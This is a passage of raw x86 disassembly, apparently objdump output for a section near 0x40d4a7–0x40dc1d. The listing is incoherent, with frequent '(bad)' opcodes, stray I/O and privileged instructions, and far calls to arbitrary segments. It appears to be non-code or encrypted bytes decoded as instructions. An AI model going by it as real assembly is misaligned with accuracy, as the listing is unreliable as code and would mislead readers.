  40d4a7:	call   0x2b6e:0xcb35353a
  40d4ae:	inc    esi
  40d4af:	cmp    eax,0x50848f30
  40d4b4:	xor    BYTE PTR [edx+edi*8+0x3c],0xd9
  40d4b9:	ja     0x40d4b1
  40d4bb:	shl    BYTE PTR [edi],1
  40d4bd:	mov    ebx,0x8a0d9eda
  40d4c2:	inc    ebp
  40d4c3:	add    al,0x6a
  40d4c5:	int3   
  40d4c6:	out    dx,eax
  40d4c7:	xor    DWORD PTR [ebx-0x2129b5de],ebp
  40d4cd:	out    dx,al
  40d4ce:	clc    
  40d4cf:	mov    cl,0x35
  40d4d1:	xor    DWORD PTR [ecx],0x2ee67373
  40d4d7:	pop    ds
  40d4d8:	stos   BYTE PTR es:[edi],al
  40d4d9:	xor    ch,BYTE PTR [ecx+ebx*8]
  40d4dc:	cwde   
  40d4dd:	and    edi,DWORD PTR [ebp-0x13]
  40d4e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4e1:	enter  0xe5d,0xca
  40d4e5:	popa   
  40d4e6:	add    BYTE PTR ds:0x646399c4,dl
  40d4ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4ed:	std    
  40d4ee:	inc    eax
  40d4ef:	jne    0x40d53e
  40d4f1:	js     0x40d53b
  40d4f3:	test   eax,0xb165bcbf
  40d4f8:	das    
  40d4f9:	jl     0x40d4d9
  40d4fb:	(bad)  
  40d4fc:	loop   0x40d48c
  40d4fe:	inc    ecx
  40d4ff:	mov    ecx,0x133b346d
  40d504:	lock cmp al,0x92
  40d507:	call   0x91d9524e
  40d50c:	push   cs
  40d50d:	popf   
  40d50e:	iret   
  40d50f:	adc    dh,dh
  40d511:	pop    ecx
  40d512:	mov    ebx,0x70984c5b
  40d517:	ficomp WORD PTR [eax+0x723f3e20]
  40d51d:	cmp    bh,dh
  40d51f:	in     eax,0xda
  40d521:	cld    
  40d522:	imul   edx,DWORD PTR [edi-0x72e23f9],0x77b0e0f5
  40d52c:	adc    al,0x4a
  40d52e:	and    al,0x72
  40d530:	icebp  
  40d531:	inc    esp
  40d532:	jne    0x40d572
  40d534:	imul   ecx,eax,0xffffff9f
  40d537:	sbb    bh,0x1e
  40d53a:	mov    esi,ecx
  40d53c:	and    ah,BYTE PTR [edi]
  40d53e:	das    
  40d53f:	xchg   edx,eax
  40d540:	(bad)  
  40d541:	adc    al,0x3f
  40d543:	dec    esi
  40d544:	xchg   esi,eax
  40d545:	jecxz  0x40d4f6
  40d547:	pusha  
  40d548:	popa   
  40d549:	test   DWORD PTR [esi],ecx
  40d54b:	push   ss
  40d54c:	add    al,0xbb
  40d54e:	(bad)  
  40d54f:	imul   ecx,DWORD PTR [esi-0x32],0x9955b79f
  40d556:	sub    eax,0x1df6e5c9
  40d55b:	mov    al,0xe2
  40d55d:	fnstcw WORD PTR [edi-0x170cbbb6]
  40d563:	out    0xda,eax
  40d565:	aad    0xb4
  40d567:	and    bl,al
  40d569:	add    DWORD PTR [eax-0x4919b841],0xfffffffb
  40d570:	jp     0x40d562
  40d572:	xor    DWORD PTR [edi+0x5e721488],eax
  40d578:	cdq    
  40d579:	sub    edi,ebp
  40d57b:	xchg   ecx,eax
  40d57c:	push   es
  40d57d:	ds jl  0x40d5ed
  40d580:	mov    dl,BYTE PTR [ebp+0x70d68220]
  40d586:	mov    ch,0x70
  40d588:	rcl    BYTE PTR [ebx+0x70],cl
  40d58b:	mov    dh,0x53
  40d58d:	adc    DWORD PTR [esi],esp
  40d58f:	push   0xffffffd3
  40d591:	stc    
  40d592:	dec    esi
  40d593:	stos   DWORD PTR es:[edi],eax
  40d594:	jne    0x40d532
  40d596:	ror    cl,0x41
  40d599:	xor    edi,DWORD PTR [esi]
  40d59b:	stos   BYTE PTR es:[edi],al
  40d59c:	ins    BYTE PTR es:[edi],dx
  40d59d:	pop    eax
  40d59f:	pop    esp
  40d5a0:	xor    DWORD PTR [ebx],edi
  40d5a2:	out    dx,al
  40d5a3:	jl     0x40d583
  40d5a5:	outs   dx,BYTE PTR ds:[esi]
  40d5a6:	sbb    cl,cl
  40d5a8:	lahf   
  40d5a9:	mov    bl,0x53
  40d5ab:	push   es
  40d5ac:	cwde   
  40d5ad:	mov    cl,0xb
  40d5af:	mov    dh,0xc5
  40d5b1:	xchg   ebp,eax
  40d5b2:	sub    DWORD PTR [ebx],edi
  40d5b4:	or     cl,BYTE PTR [ecx+0x9]
  40d5b7:	xor    DWORD PTR [edx+edi*4+0x13],esi
  40d5bb:	pop    es
  40d5bc:	and    dh,ah
  40d5be:	gs loop 0x40d54f
  40d5c1:	shr    BYTE PTR es:[eax],0x44
  40d5c5:	scas   eax,DWORD PTR es:[edi]
  40d5c6:	aas    
  40d5c7:	popa   
  40d5c8:	popf   
  40d5c9:	in     al,0x75
  40d5cb:	inc    esp
  40d5cc:	loop   0x40d586
  40d5ce:	adc    eax,0x53bc80cc
  40d5d3:	xlat   BYTE PTR ds:[ebx]
  40d5d4:	pop    ecx
  40d5d5:	pop    ecx
  40d5d6:	lods   al,BYTE PTR ds:[esi]
  40d5d7:	add    al,0xe3
  40d5d9:	stos   DWORD PTR es:[edi],eax
  40d5da:	sbb    eax,0xdfdfc722
  40d5df:	jmp    0x705c2c19
  40d5e4:	(bad)  
  40d5e5:	std    
  40d5e6:	push   esi
  40d5e7:	aam    0xc2
  40d5e9:	jne    0x40d5de
  40d5eb:	test   DWORD PTR [edx+0x9],edx
  40d5ee:	into   
  40d5ef:	xlat   BYTE PTR ds:[ebx]
  40d5f0:	pop    ds
  40d5f1:	stos   BYTE PTR es:[edi],al
  40d5f2:	push   cs
  40d5f3:	iret   
  40d5f4:	in     eax,0x38
  40d5f6:	jae    0x40d58e
  40d5f8:	pop    eax
  40d5f9:	call   0xd6ab3511
  40d5fe:	sti    
  40d5ff:	clc    
  40d600:	push   eax
  40d601:	xor    BYTE PTR [edx],bl
  40d603:	fwait
  40d604:	dec    ebx
  40d605:	push   ebx
  40d606:	jne    0x40d679
  40d608:	push   cs
  40d609:	jecxz  0x40d617
  40d60b:	into   
  40d60c:	icebp  
  40d60d:	push   ecx
  40d60e:	inc    eax
  40d60f:	mov    edx,0xf3f39401
  40d614:	or     ch,BYTE PTR [eax+0x50]
  40d617:	jb     0x40d67d
  40d619:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d61a:	pop    eax
  40d61b:	pusha  
  40d61c:	xor    DWORD PTR [eax+0x35],0xe1e9b7c7
  40d623:	js     0x40d5c2
  40d625:	ins    BYTE PTR es:[edi],dx
  40d626:	inc    edi
  40d627:	sbb    BYTE PTR [edx],al
  40d629:	and    eax,0x9234bca1
  40d62e:	(bad)  
  40d630:	mov    esp,eax
  40d632:	test   DWORD PTR [eax+0x78],edi
  40d635:	pop    esi
  40d636:	not    DWORD PTR [edx]
  40d638:	dec    ebp
  40d639:	mov    al,0xc2
  40d63b:	dec    esp
  40d63c:	shl    bl,cl
  40d63e:	test   al,0xd4
  40d640:	adc    DWORD PTR ds:0x7ab3c708,eax
  40d646:	sti    
  40d647:	fwait
  40d648:	test   eax,0xbf333eae
  40d64d:	sub    ebp,edi
  40d64f:	and    al,0x79
  40d651:	in     eax,0x56
  40d653:	xor    esp,esp
  40d655:	and    DWORD PTR ds:0x7297292f,ecx
  40d65b:	pop    ecx
  40d65c:	dec    esp
  40d65d:	jg     0x40d60a
  40d65f:	dec    esp
  40d660:	lock fldenv [esi+0x6e]
  40d664:	jnp    0x40d5e8
  40d666:	jl     0x40d669
  40d668:	mov    edx,edx
  40d66a:	cmp    ah,BYTE PTR [edi+0x54973e26]
  40d670:	jbe    0x40d6d4
  40d672:	cld    
  40d673:	xor    BYTE PTR [edx+0x2e56bf3b],bh
  40d679:	sbb    DWORD PTR ds:0xf047aa8b,ebp
  40d67f:	pop    es
  40d680:	pop    eax
  40d681:	jl     0x40d6fe
  40d683:	out    dx,al
  40d684:	(bad)  
  40d685:	faddp  st(3),st
  40d687:	ret    
  40d688:	cmp    DWORD PTR [eiz*2+0x766ad479],0x1f00ef79
  40d693:	jo     0x40d70e
  40d695:	and    edi,ebx
  40d697:	jns    0x40d6c9
  40d699:	sub    dl,al
  40d69b:	mov    eax,ds:0x6fc70e20
  40d6a0:	in     eax,0x3f
  40d6a2:	push   ds
  40d6a3:	cwde   
  40d6a4:	xor    BYTE PTR [ebx-0x1f],bh
  40d6a7:	adc    eax,0x2e02e540
  40d6ac:	cmp    ebx,DWORD PTR [ebp-0x56]
  40d6af:	cdq    
  40d6b0:	xchg   esp,eax
  40d6b1:	icebp  
  40d6b2:	jmp    0x17ece4fd
  40d6b7:	adc    DWORD PTR [esp+ebp*1+0x3d8b91ed],edx
  40d6be:	mov    dh,0x2a
  40d6c0:	xor    edi,DWORD PTR [ecx+ecx*2+0x223baea5]
  40d6c7:	rcr    edx,0x5d
  40d6ca:	jmp    0x40d737
  40d6cc:	add    ah,BYTE PTR [ebx]
  40d6ce:	idiv   DWORD PTR [eax]
  40d6d0:	or     ebp,DWORD PTR [esi]
  40d6d2:	jb     0x40d735
  40d6d4:	jp     0x40d67b
  40d6d6:	jae    0x40d6c5
  40d6d8:	pop    ebp
  40d6d9:	arpl   si,ax
  40d6db:	pop    ecx
  40d6dc:	(bad)  
  40d6de:	sti    
  40d6df:	or     eax,0x4c
  40d6e2:	sub    ebx,DWORD PTR [ebx+0x3c]
  40d6e5:	aam    0xc2
  40d6e7:	loope  0x40d6ce
  40d6e9:	mov    ah,0x85
  40d6eb:	loop   0x40d6b1
  40d6ed:	les    ecx,FWORD PTR [edi+ebp*1]
  40d6f0:	mov    esp,0x8368b505
  40d6f5:	mov    dl,0xcf
  40d6f7:	jno    0x40d6d2
  40d6f9:	dec    ecx
  40d6fa:	imul   ecx,DWORD PTR [edx+0x2],0xd3bcb763
  40d701:	scas   eax,DWORD PTR es:[edi]
  40d702:	dec    edi
  40d703:	pop    esi
  40d704:	nop
  40d705:	fs mov ecx,0xc4c1b14f
  40d70b:	rcl    eax,cl
  40d70d:	mov    eax,0x65536114
  40d712:	test   dl,ah
  40d714:	fidiv  WORD PTR [edi-0x65bc239d]
  40d71a:	inc    edx
  40d71b:	cmp    al,0x46
  40d71d:	test   eax,0xa816aa64
  40d722:	sub    DWORD PTR [ebx-0x2af58ccb],edi
  40d728:	test   DWORD PTR [edi-0x19497d42],ecx
  40d72e:	jns    0x40d717
  40d730:	not    BYTE PTR [eax]
  40d732:	dec    eax
  40d733:	(bad)  
  40d734:	mov    edx,0x306634b5
  40d739:	jo     0x40d6db
  40d73b:	mov    dh,0x87
  40d73d:	int    0xe2
  40d73f:	xor    DWORD PTR [eax],edx
  40d741:	jg     0x40d790
  40d743:	aad    0xe
  40d745:	and    cl,BYTE PTR [edi+0x11e621be]
  40d74b:	pusha  
  40d74c:	pop    esi
  40d74d:	hlt    
  40d74e:	jp     0x40d6ef
  40d750:	mov    dl,0x61
  40d752:	dec    ebp
  40d753:	ds inc edx
  40d755:	add    ebx,edx
  40d757:	pop    esp
  40d758:	lahf   
  40d759:	outs   dx,DWORD PTR ds:[esi]
  40d75a:	mov    ebp,0x87358597
  40d75f:	je     0x40d7bc
  40d761:	dec    ebp
  40d762:	dec    esi
  40d763:	xchg   BYTE PTR [edi-0x203025af],bh
  40d769:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d76a:	pop    ss
  40d76b:	dec    ebp
  40d76c:	cmp    ch,BYTE PTR ds:0x8671ff9e
  40d772:	in     eax,0xa8
  40d774:	mov    WORD PTR [eax+0x14],es
  40d777:	xchg   eax,ebp
  40d779:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d77a:	loop   0x40d71d
  40d77c:	sub    bl,bl
  40d77e:	lods   eax,DWORD PTR ds:[esi]
  40d77f:	cmp    edi,DWORD PTR [ebx+esi*8-0x22fb4a9c]
  40d786:	mov    bl,0x8d
  40d788:	pushf  
  40d789:	loope  0x40d7d2
  40d78b:	fimul  WORD PTR [ecx+0x63]
  40d78e:	ffree  st(6)
  40d790:	daa    
  40d791:	push   cs
  40d792:	dec    eax
  40d793:	call   0x81ab24a4
  40d798:	xchg   edi,eax
  40d799:	mov    ecx,0xf3f4bc1b
  40d79e:	sub    BYTE PTR [edi-0x2412e5ac],cl
  40d7a4:	adc    al,0x3d
  40d7a6:	add    bh,BYTE PTR [esi+esi*1+0x55]
  40d7aa:	jbe    0x40d7ff
  40d7ac:	xlat   BYTE PTR ds:[ebx]
  40d7ad:	push   es
  40d7ae:	mov    ah,0xae
  40d7b0:	add    BYTE PTR [edi],dh
  40d7b2:	and    eax,0xf2d7de91
  40d7b7:	and    DWORD PTR [eax-0x43],ebx
  40d7ba:	jmp    0xb7afe838
  40d7bf:	repz div bh
  40d7c2:	xor    al,0x55
  40d7c4:	mov    esi,0xb59308e9
  40d7c9:	js     0x40d830
  40d7cb:	ret    
  40d7cc:	xchg   ecx,eax
  40d7cd:	cmovb  esi,DWORD PTR [edi]
  40d7d0:	push   esp
  40d7d1:	xlat   BYTE PTR ds:[ebx]
  40d7d2:	mov    ss:0x294ae5bc,al
  40d7d8:	push   edi
  40d7d9:	test   BYTE PTR ss:[edx-0x7f93b3b1],ah
  40d7e0:	jecxz  0x40d80e
  40d7e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7e3:	es pop edi
  40d7e5:	push   edi
  40d7e6:	jb     0x40d860
  40d7e8:	xor    DWORD PTR [edx+0x29856aeb],edi
  40d7ee:	mov    esi,0x944e08cc
  40d7f3:	cwde   
  40d7f4:	fs adc eax,0x619e457d
  40d7fa:	aaa    
  40d7fb:	mov    cl,BYTE PTR [edx+0x32]
  40d7fe:	ins    DWORD PTR es:[edi],dx
  40d7ff:	inc    edx
  40d800:	xor    ch,BYTE PTR [edx+0xf]
  40d803:	clc    
  40d804:	and    DWORD PTR [eax-0x5a],esp
  40d807:	push   cs
  40d808:	je     0x40d860
  40d80a:	imul   eax,DWORD PTR [edi+0x1d],0xffffffbd
  40d80e:	mov    eax,ds:0x2bf5e246
  40d813:	sbb    DWORD PTR [edx+0xb87f197],eax
  40d819:	mov    ecx,DWORD PTR ds:0xce97af92
  40d81f:	jae    0x40d873
  40d821:	inc    DWORD PTR [ebx]
  40d823:	daa    
  40d824:	xor    dh,BYTE PTR [ebx-0x123bf478]
  40d82a:	inc    ecx
  40d82b:	frndint 
  40d82d:	fmul   QWORD PTR [eax+0x791c681f]
  40d833:	addr16 sti 
  40d835:	cs popf 
  40d837:	pop    ebp
  40d838:	inc    ecx
  40d839:	inc    ebp
  40d83a:	push   ecx
  40d83b:	imul   ecx,ebp,0xffffffd5
  40d83e:	nop
  40d83f:	push   0x45
  40d841:	push   0xa9b05868
  40d846:	mov    ebp,0x3f204cae
  40d84b:	icebp  
  40d84c:	ins    BYTE PTR es:[edi],dx
  40d84d:	mov    DWORD PTR [ebp-0x33],esp
  40d850:	fs sub al,0xfc
  40d853:	push   edx
  40d854:	push   esp
  40d855:	or     esp,ebx
  40d857:	mov    ebx,0x841ad7ad
  40d85c:	fsubr  st,st(6)
  40d85e:	add    BYTE PTR [edx],ah
  40d860:	dec    ebp
  40d861:	enter  0x415c,0x74
  40d865:	(bad)  
  40d866:	jl     0x40d8a4
  40d868:	ret    
  40d869:	adc    BYTE PTR [esi],ch
  40d86b:	inc    eax
  40d86c:	and    DWORD PTR [edi],ebp
  40d86e:	cld    
  40d86f:	and    al,0x47
  40d871:	cmp    eax,0x4a3f88d7
  40d876:	outs   dx,BYTE PTR ds:[esi]
  40d877:	push   ebx
  40d878:	add    ch,BYTE PTR ds:0x207c7992
  40d87e:	adc    esp,DWORD PTR [edx+0x35]
  40d881:	cwde   
  40d882:	mov    esi,DWORD PTR [esi+0x19]
  40d885:	xchg   DWORD PTR [edx+0x56],esi
  40d888:	in     eax,dx
  40d889:	inc    esi
  40d88a:	clc    
  40d88b:	loope  0x40d8a9
  40d88d:	sbb    DWORD PTR [edx-0x27],edi
  40d890:	mov    eax,ds:0xb1429b9a
  40d895:	popa   
  40d896:	sub    DWORD PTR [ecx],ebx
  40d898:	push   0xffffff94
  40d89a:	push   ebx
  40d89b:	sub    BYTE PTR [edi],0xc
  40d89e:	aaa    
  40d89f:	xchg   DWORD PTR [edx+edi*4+0x7f],ebx
  40d8a3:	adc    dh,BYTE PTR [esi+0x43]
  40d8a6:	(bad)  
  40d8a7:	push   esi
  40d8a8:	std    
  40d8a9:	je     0x40d8e7
  40d8ab:	mov    esi,0xa9e4cf45
  40d8b0:	ficom  DWORD PTR [ebx-0x3e]
  40d8b3:	mov    dh,BYTE PTR [ecx-0x12]
  40d8b6:	pop    esp
  40d8b7:	in     al,0x60
  40d8b9:	push   ebx
  40d8ba:	inc    eax
  40d8bb:	lods   al,BYTE PTR ds:[esi]
  40d8bc:	cmp    eax,0x1bb4f4df
  40d8c1:	inc    ecx
  40d8c2:	dec    edx
  40d8c3:	int    0x24
  40d8c5:	push   0x5996dcfe
  40d8ca:	mov    edi,0x30559232
  40d8cf:	stos   BYTE PTR es:[edi],al
  40d8d0:	retf   
  40d8d1:	or     edi,DWORD PTR [ebx-0xfafd6a9]
  40d8d7:	jbe    0x40d8fc
  40d8d9:	adc    eax,DWORD PTR [esi+0x4909c8b2]
  40d8df:	xchg   ebx,eax
  40d8e0:	xchg   BYTE PTR [edx-0x63112f6],ah
  40d8e6:	mov    edx,0x54646e05
  40d8eb:	jo     0x40d8f3
  40d8ed:	push   ecx
  40d8ee:	mov    ecx,0x69e3cf8d
  40d8f3:	scas   eax,DWORD PTR es:[edi]
  40d8f4:	fst    QWORD PTR [edi-0x7f]
  40d8f7:	mov    ecx,0x7047dfa3
  40d8fc:	cli    
  40d8fd:	sbb    al,0xb2
  40d8ff:	into   
  40d900:	add    DWORD PTR [edi+ebp*1-0x74aed080],ecx
  40d907:	repz pop DWORD PTR [bp+si]
  40d90b:	mov    bl,0x3
  40d90d:	sar    BYTE PTR [ebx-0x55],cl
  40d910:	add    eax,0x7d47e8d8
  40d915:	sub    dl,BYTE PTR [edi+0x1eb271a5]
  40d91b:	retf   
  40d91c:	loop   0x40d905
  40d91e:	outs   dx,DWORD PTR ds:[esi]
  40d91f:	out    dx,al
  40d920:	popa   
  40d921:	mul    DWORD PTR [ebp+0x48196a0b]
  40d927:	add    BYTE PTR [esi+0x5933eccd],0xbd
  40d92e:	pushf  
  40d92f:	aad    0xf3
  40d931:	ins    DWORD PTR es:[edi],dx
  40d932:	call   DWORD PTR [ecx-0xdb660cc]
  40d938:	call   0xa311:0x7526548a
  40d93f:	dec    eax
  40d940:	xchg   ebp,eax
  40d941:	aas    
  40d942:	lods   al,BYTE PTR ds:[esi]
  40d943:	pop    edx
  40d944:	outs   dx,BYTE PTR ds:[esi]
  40d945:	popf   
  40d946:	xor    al,BYTE PTR [ebx-0x3e3bdf7d]
  40d94c:	dec    ebx
  40d94d:	fcmovbe st,st(5)
  40d94f:	out    dx,eax
  40d950:	loop   0x40d8fe
  40d952:	sub    cl,BYTE PTR [ebp-0x38780378]
  40d958:	or     BYTE PTR [ebx+0x42efe473],0x56
  40d95f:	sbb    eax,0x2fb7f9de
  40d964:	mov    esi,ebx
  40d966:	packsswb mm6,QWORD PTR [edi-0x17]
  40d96a:	loope  0x40d98c
  40d96c:	clc    
  40d96d:	mov    dh,0xd4
  40d96f:	jb     0x40d93a
  40d971:	mov    bl,dl
  40d973:	or     eax,0x3cf81b09
  40d978:	ins    BYTE PTR es:[edi],dx
  40d979:	fdiv   QWORD PTR [esi-0x69]
  40d97c:	neg    DWORD PTR [ecx-0x6b]
  40d97f:	or     DWORD PTR [edi],edx
  40d981:	cmp    al,0x7a
  40d983:	mov    ds:0x441f057,al
  40d988:	push   edx
  40d989:	sbb    eax,0xf3928cdf
  40d98e:	inc    esp
  40d98f:	jbe    0x40d970
  40d991:	cmp    bl,bh
  40d993:	leave  
  40d994:	neg    DWORD PTR [esi+0x30]
  40d997:	in     eax,0x7e
  40d999:	cli    
  40d99a:	mov    cl,0x14
  40d99c:	sub    cl,ah
  40d99e:	push   esi
  40d99f:	push   cs
  40d9a0:	(bad)
  40d9a3:	push   edx
  40d9a4:	daa    
  40d9a5:	fwait
  40d9a6:	(bad)  
  40d9a7:	aam    0x7f
  40d9a9:	scas   eax,DWORD PTR es:[edi]
  40d9aa:	ss cli 
  40d9ac:	(bad)  
  40d9ad:	jecxz  0x40d9ee
  40d9af:	lea    esi,[eax-0x11]
  40d9b2:	push   ds
  40d9b3:	mov    dl,al
  40d9b5:	mov    al,ds:0x16384886
  40d9ba:	xor    al,0x60
  40d9bc:	inc    edx
  40d9bd:	je     0x40da08
  40d9bf:	(bad)  [edx-0x12]
  40d9c2:	imul   edi,DWORD PTR [ebx+0x5f],0x5e138106
  40d9c9:	push   ss
  40d9ca:	xor    BYTE PTR [ebx],dl
  40d9cc:	cmp    DWORD PTR ds:0xdbf1919e,ebx
  40d9d2:	xchg   ebp,eax
  40d9d3:	cwde   
  40d9d4:	jmp    0x8c4f:0xfcdfe4f1
  40d9db:	sub    DWORD PTR [ecx],esp
  40d9dd:	hlt    
  40d9de:	cmp    BYTE PTR [edi+0x673baa3f],dl
  40d9e4:	mov    cl,0xfc
  40d9e6:	popa   
  40d9e7:	cmp    eax,0xe7177482
  40d9ec:	push   ebp
  40d9ed:	aaa    
  40d9ee:	push   ss
  40d9ef:	imul   ecx,esi,0xffffffc1
  40d9f2:	xor    DWORD PTR [edx],ebx
  40d9f4:	div    eax
  40d9f6:	jl     0x40d9e3
  40d9f8:	add    al,BYTE PTR [edx+0x609cedd0]
  40d9fe:	test   DWORD PTR [esi+0x111ce5b3],0x263128ee
  40da08:	pop    ss
  40da09:	xchg   ecx,eax
  40da0a:	fs and eax,0x488ed196
  40da10:	into   
  40da11:	aam    0xc7
  40da13:	dec    ecx
  40da15:	sbb    eax,0xc7c7e2d0
  40da1a:	jl     0x40da6e
  40da1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da1d:	ror    DWORD PTR [edx+0x59d37607],cl
  40da23:	cmp    al,0x39
  40da25:	inc    edi
  40da26:	or     eax,0x3122a314
  40da2b:	cs xchg ebx,eax
  40da2d:	out    0x36,eax
  40da2f:	into   
  40da30:	add    DWORD PTR [ebp+edi*4+0x2],0x11629374
  40da38:	mov    BYTE PTR [edi+0xc],dl
  40da3b:	or     al,0xf8
  40da3d:	cwde   
  40da3e:	mov    bl,bh
  40da40:	dec    eax
  40da41:	lods   eax,DWORD PTR ds:[esi]
  40da42:	xchg   DWORD PTR [edi-0x70],eax
  40da45:	jl     0x40d9d9
  40da47:	jne    0x40daa7
  40da49:	es dec esp
  40da4b:	sbb    eax,DWORD PTR [edi+ebp*4+0x64a2c9ba]
  40da52:	stos   DWORD PTR es:[edi],eax
  40da53:	mov    edi,0xdd933a32
  40da58:	adc    esp,0xa53ccbc8
  40da5e:	jge    0x40dac9
  40da60:	mov    edx,0x16f48dd8
  40da65:	and    BYTE PTR [esi-0x21],0x86
  40da69:	ins    DWORD PTR es:[edi],dx
  40da6a:	jnp    0x40da97
  40da6c:	inc    esi
  40da6d:	mov    dh,0xae
  40da6f:	scas   al,BYTE PTR es:[edi]
  40da70:	in     eax,0xd2
  40da72:	jbe    0x40da0b
  40da74:	mov    al,0x75
  40da76:	mov    WORD PTR [eax+edi*8-0x487d9cd0],ss
  40da7d:	jmp    0x40da37
  40da7f:	sbb    al,0x3c
  40da81:	inc    esp
  40da82:	cmp    DWORD PTR [edi],0x0
  40da85:	mov    esp,DWORD PTR [eax]
  40da87:	fidivr DWORD PTR [esi]
  40da89:	sbb    edi,DWORD PTR [ecx]
  40da8b:	mov    ecx,0xea7a6a49
  40da90:	rcr    BYTE PTR [edx+ebx*1],1
  40da93:	mov    esp,0x757b84ed
  40da98:	xchg   ah,dh
  40da9a:	fld    TBYTE PTR [edx+ebx*8+0x5]
  40da9e:	scas   al,BYTE PTR es:[edi]
  40da9f:	imul   ecx,DWORD PTR [ebx-0x73660692],0xc04f3328
  40daa9:	xor    DWORD PTR [ecx+0x77935e12],ecx
  40daaf:	ret    0xc0fe
  40dab2:	cmp    al,0xa6
  40dab4:	cwde   
  40dab5:	jb     0x40da5d
  40dab7:	xchg   edx,eax
  40dab8:	ja     0x40dab0
  40daba:	sbb    eax,0x8fc474a6
  40dabf:	push   ss
  40dac0:	mov    ebx,0x5eec3ff2
  40dac5:	dec    eax
  40dac6:	int3   
  40dac7:	sub    esi,ebp
  40dac9:	inc    esi
  40daca:	fucomp st(4)
  40dacc:	adc    eax,ebp
  40dace:	imul   eax,DWORD PTR [eax-0x7df76138],0x580d9f2a
  40dad8:	(bad)  
  40dada:	mov    bl,0x43
  40dadc:	dec    ecx
  40dadd:	push   edx
  40dade:	push   ebx
  40dadf:	outs   dx,DWORD PTR ds:[esi]
  40dae0:	mov    ?,WORD PTR [ebp-0x11]
  40dae3:	mov    edx,0xaaf1039a
  40dae8:	xlat   BYTE PTR ds:[ebx]
  40dae9:	pushf  
  40daea:	inc    esi
  40daeb:	or     al,BYTE PTR [ebx]
  40daed:	dec    esp
  40daee:	cdq    
  40daef:	je     0x40db35
  40daf1:	push   ebp
  40daf2:	into   
  40daf3:	dec    edi
  40daf4:	xchg   BYTE PTR [edi+0x1],dh
  40daf7:	call   0x5d0b:0x69ed181f
  40dafe:	out    dx,eax
  40daff:	ins    BYTE PTR es:[edi],dx
  40db00:	adc    DWORD PTR [ebx-0x71],0x1d
  40db04:	push   0x42acc9fa
  40db09:	inc    edx
  40db0a:	aas    
  40db0b:	push   ebp
  40db0c:	lods   al,BYTE PTR ds:[esi]
  40db0d:	enter  0x6177,0x5d
  40db11:	push   ds
  40db12:	imul   ecx,DWORD PTR [esi-0x66],0x6c34e437
  40db19:	or     esp,DWORD PTR [eax]
  40db1b:	(bad)  
  40db1c:	out    0x49,eax
  40db1e:	jne    0x40dab2
  40db20:	xchg   eax,esp
  40db22:	dec    edi
  40db23:	popa   
  40db24:	add    dl,BYTE PTR [edi+eiz*1]
  40db27:	pop    ecx
  40db28:	push   esi
  40db29:	push   ds
  40db2a:	ins    BYTE PTR es:[edi],dx
  40db2b:	push   ds
  40db2c:	jno    0x40dad7
  40db2e:	cmp    ebx,DWORD PTR [eax+0x1a263816]
  40db34:	into   
  40db35:	mov    cl,0x99
  40db37:	add    esi,0xc35bd459
  40db3d:	inc    esi
  40db3e:	les    eax,FWORD PTR [ecx]
  40db40:	cmp    eax,0x9be23951
  40db45:	repnz xor ebp,DWORD PTR [eax]
  40db48:	pop    ecx
  40db49:	dec    esi
  40db4a:	pop    ecx
  40db4b:	les    ecx,FWORD PTR [ebx-0x4]
  40db4e:	test   BYTE PTR ds:0xcf69911c,0xf4
  40db55:	lods   al,BYTE PTR ds:[esi]
  40db56:	mov    bh,0x17
  40db58:	outs   dx,BYTE PTR ds:[esi]
  40db59:	mov    ebp,0x48186f85
  40db5e:	pop    esi
  40db5f:	fild   WORD PTR [ebx+0x3c480ef5]
  40db65:	jno    0x40db2e
  40db67:	sub    DWORD PTR cs:[ebp+0x76],esp
  40db6b:	out    dx,al
  40db6c:	cs xchg ecx,eax
  40db6e:	arpl   di,sp
  40db70:	ss loope 0x40db11
  40db73:	mov    ebp,0x69a4c990
  40db78:	lahf   
  40db79:	jae    0x40db72
  40db7b:	test   DWORD PTR [ebx],0xf33e6633
  40db81:	fs stc 
  40db83:	cmp    eax,0x6233ff8
  40db88:	add    DWORD PTR [edx+0xbbbbfb7],edi
  40db8e:	call   0xdb5f:0x9efa3a43
  40db95:	daa    
  40db96:	push   ebx
  40db97:	idiv   esi
  40db99:	cli    
  40db9a:	leave  
  40db9b:	sbb    DWORD PTR [ebx+0x43],ebx
  40db9e:	in     eax,dx
  40db9f:	ret    
  40dba0:	adc    eax,0x4026fa18
  40dba5:	or     BYTE PTR [edx+0x3],0x49
  40dba9:	pop    ds
  40dbaa:	stos   BYTE PTR es:[edi],al
  40dbab:	repnz cdq 
  40dbad:	mov    ds:0x150e5433,al
  40dbb2:	jl     0x40dbc9
  40dbb4:	call   0x19b1a365
  40dbb9:	cmc    
  40dbba:	xor    BYTE PTR [ebp-0x2c9daf2e],bh
  40dbc0:	sub    eax,0xcba52669
  40dbc5:	jae    0x40dc0f
  40dbc7:	pop    edi
  40dbc8:	mov    dl,0xbe
  40dbca:	daa    
  40dbcb:	loopne 0x40db83
  40dbcd:	mov    ebp,0xc180d93b
  40dbd2:	lock jno 0x40db94
  40dbd5:	dec    BYTE PTR [esi]
  40dbd7:	push   es
  40dbd8:	fbld   TBYTE PTR [ebx+0x5d50b8fa]
  40dbde:	push   ecx
  40dbdf:	cmp    BYTE PTR [eax],bh
  40dbe1:	repnz mov esp,0x4bc8c90d
  40dbe7:	test   al,0x6b
  40dbe9:	sbb    al,0xd
  40dbeb:	push   edx
  40dbec:	sbb    BYTE PTR [ebp+0x5aec17d9],bh
  40dbf2:	arpl   WORD PTR [esp+edx*1+0x4ce921f0],sp
  40dbf9:	inc    esp
  40dbfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbfb:	je     0x40dc35
  40dbfd:	arpl   WORD PTR [esi+0x58964d1f],di
  40dc03:	rol    DWORD PTR [ebx+0x78684cf3],1
  40dc09:	icebp  
  40dc0a:	or     al,0x1a
  40dc0c:	sub    eax,0xce98ec37
  40dc11:	repnz adc DWORD PTR [edi-0xc],0x79
  40dc16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc17:	mov    al,BYTE PTR [eax]
  40dc19:	jne    0x40dc81
  40dc1b:	test   bl,cl
  40dc1d:	ds mov ebp,0xdb3d7cc7
